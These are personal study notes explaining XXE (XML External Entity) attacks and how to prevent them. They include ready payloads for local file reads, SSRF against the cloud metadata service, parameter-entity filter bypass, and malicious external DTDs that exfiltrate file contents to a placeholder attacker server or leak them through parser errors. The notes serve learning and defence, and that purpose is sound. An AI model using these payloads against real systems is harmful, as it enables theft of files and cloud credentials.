# My Learnings

XXE is one of those vulnerabilities that lives in a part of the web stack most people forget about. Everyone thinks about SQL injection or XSS but XML parsing is its own attack surface and when it is misconfigured it can be devastating. The reason it is so impactful is that exploitation happens inside the server, the request goes in, the server processes it, and the server itself reads files or makes network requests on your behalf. You are not breaking in from the outside, you are making the server do things for you from the inside.



## What is XXE

XML has a feature called external entities. In the XML specification you can define a reference inside the DTD (Document Type Definition) that points to an external resource, either a file on the filesystem or a URL. When the parser processes the document it resolves these references and substitutes the content. This is a legitimate XML feature that was designed for document composition and reuse.

The vulnerability exists when an application accepts XML input from a user, passes it to an XML parser with external entity processing enabled, and then does something with the parsed output. The attacker injects their own DTD declaration defining an entity that points to a sensitive resource. The parser resolves it and the attacker gets the content.

The structure of an XXE payload always looks like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>
    <element>&xxe;</element>
</root>
```

The DOCTYPE block defines the entity. The `&xxe;` reference in the document body tells the parser where to substitute the resolved value.



## Where XXE Typically Lives

Any endpoint that parses XML is potentially vulnerable. Common places to look:

**Stock checkers, search features, form submissions** that accept XML bodies. If you intercept a request and see `Content-Type: application/xml` or `text/xml`, that is an immediate target.

**File upload functionality** that accepts formats built on XML. DOCX, XLSX, PPTX, SVG, and PDF all contain XML internally. Uploading a crafted file to an application that parses its contents can trigger XXE.

**APIs that accept both JSON and XML.** Change `Content-Type: application/json` to `Content-Type: application/xml` in the request, convert the body to XML, and test for XXE. Some parsers are enabled for both formats.

**SOAP web services.** SOAP is XML-based by definition and older SOAP implementations almost always have external entity processing enabled.

The key question is always: does the server parse this XML and does any part of the parsed output reach me? If yes, test for XXE.



## Types of XXE

### Classic (In-Band) XXE

The application reflects the resolved entity value back in the HTTP response. You can read the output directly. This is the simplest case to exploit.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<element>&xxe;</element>
```

If the contents of `/etc/passwd` appear in the response, the vulnerability is confirmed and you have immediate file read.

### XXE for SSRF

Instead of reading a local file you point the entity at an internal HTTP URL. The server makes the request on your behalf. Because the request comes from inside the server, it can reach services that are not accessible from the internet.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<element>&xxe;</element>
```

This is particularly dangerous in cloud environments where the metadata service at `169.254.169.254` stores IAM credentials and instance information. You enumerate the directory structure iteratively, updating the URL each time to go deeper, until you reach the credential endpoint.

### Blind XXE with Out-of-Band Interaction

The parser resolves external entities but the application does not return the resolved value in the response. You cannot see the output. To confirm the vulnerability exists you point the entity at a server you control and watch for incoming connections.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-DOMAIN"> ]>
<element>&xxe;</element>
```

Burp Collaborator provides unique hostnames and records all DNS and HTTP interactions made to them. If the parser resolves the entity your Collaborator server receives a DNS lookup and usually an HTTP request. This confirms blind XXE even though nothing appears in the application response.

### Blind XXE via XML Parameter Entities

Some applications implement partial protection by blocking regular external entity syntax. XML also supports parameter entities which have different syntax and are processed during DTD parsing rather than document body parsing. They are often missed by basic filters.

Regular entity: `<!ENTITY name SYSTEM "...">`  referenced as `&name;`

Parameter entity: `<!ENTITY % name SYSTEM "...">` referenced as `%name;` but only inside the DTD

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-DOMAIN"> %xxe; ]>
```

The `%xxe;` reference fires during DTD processing. If regular entities are blocked but parameter entities are not, this bypasses the protection.

### Blind XXE via External DTD (Data Exfiltration)

When the application does not return the entity value in the response, you need a way to get data out. The technique is to host a malicious DTD on an attacker-controlled server. That DTD reads a local file and constructs an outbound request containing the file contents embedded in the URL.

Malicious DTD hosted on exploit server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

The main XML payload loads the external DTD using a parameter entity:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://EXPLOIT-SERVER/malicious.dtd"> %xxe; ]>
```

When the parser loads the DTD it reads the local file, constructs a URL with the file contents in the query string, and makes an HTTP request to Collaborator. The file contents arrive at Collaborator embedded in that request.

### Blind XXE via Error Messages

If the server has egress filtering and cannot make outbound HTTP requests, the exfiltration callback approach fails. Error-based exfiltration works around this by making the parser include the sensitive data in an error message that appears in the response.

The technique constructs a file path that includes the contents of the target file, then intentionally triggers a parser error by pointing at a path that does not exist. The parser generates an error that includes the attempted path, which contains the file contents.

Malicious DTD:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser reads `/etc/passwd`, tries to open a nonexistent file with that content embedded in the path, fails, and the error message printed in the response contains the file contents. No outbound connection required.



## How to Find XXE

**Step 1: Find XML parsing endpoints**

Look for requests with `Content-Type: application/xml` or `text/xml`. Look for file upload features. Try changing JSON Content-Type headers to XML and converting the body.

**Step 2: Test classic XXE first**

Add a DOCTYPE declaration with an external entity pointing to `/etc/passwd` or `/etc/hostname`. Reference the entity in a field that gets reflected in the response. If the file contents appear, confirmed.

**Step 3: If nothing in the response, test blind**

Add a DOCTYPE with an entity pointing to your Burp Collaborator domain. Send the request and poll Collaborator. DNS and HTTP interactions confirm the parser is resolving external entities even though the response shows nothing.

**Step 4: Try parameter entities if regular entities are blocked**

If you get an error or no interaction with regular entity syntax, switch to parameter entity syntax. These bypass some filters.

**Step 5: If blind is confirmed, attempt exfiltration**

If you have outbound connectivity available, host an external DTD that reads the target file and sends its contents to Collaborator in an HTTP request. If outbound is blocked, use the error-based approach.



## Important Technical Details

**The `&#x25;` encoding in nested DTDs** is how you write a literal `%` character inside a DTD entity value. You cannot write `%` directly inside a parameter entity value because the parser would try to interpret it as another entity reference. `&#x25;` is the XML numeric character reference for `%` and it defers interpretation until the entity is expanded.

**Why `/etc/passwd` and `/etc/hostname`**

These are the standard test files because they exist on virtually every Linux system and the web server process almost always has read access to them. `/etc/passwd` is long and gives a lot of visible output confirming the read worked. `/etc/hostname` is short and clean, easier to see in an error message or query string.

**Entity resolution schemes**

`file://` reads local files. `http://` and `https://` make outbound HTTP requests. `ftp://` makes FTP requests. Some parsers also support `php://`, `data://`, and other schemes depending on the environment.

**Why external entity processing is on by default**

It is a legitimate XML feature. Many older applications and libraries were built when this was not considered a security concern. Turning it off requires explicit configuration that many developers do not know they need to do.



## Prevention

Disable external entity processing in the XML parser. Most modern XML libraries have a configuration option for this:

In Java (DocumentBuilderFactory):
```java
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

In Python (lxml):
```python
parser = etree.XMLParser(resolve_entities=False)
```

The application should also validate and sanitise XML input and ideally use a less complex format like JSON where external entity processing is not a concern.



## Summary Table

| Type | Visible Output | Exfiltration Method | Needs Outbound |
|||||
| Classic file read | Yes | Direct reflection in response | No |
| SSRF via XXE | Yes | Internal HTTP via entity | No |
| Blind OOB | No | DNS and HTTP callback | Yes |
| Blind via parameter entities | No | DNS and HTTP callback | Yes |
| Blind via external DTD | No | File contents in Collaborator HTTP request | Yes |
| Blind via error messages | No | File contents in parser error in response | No |

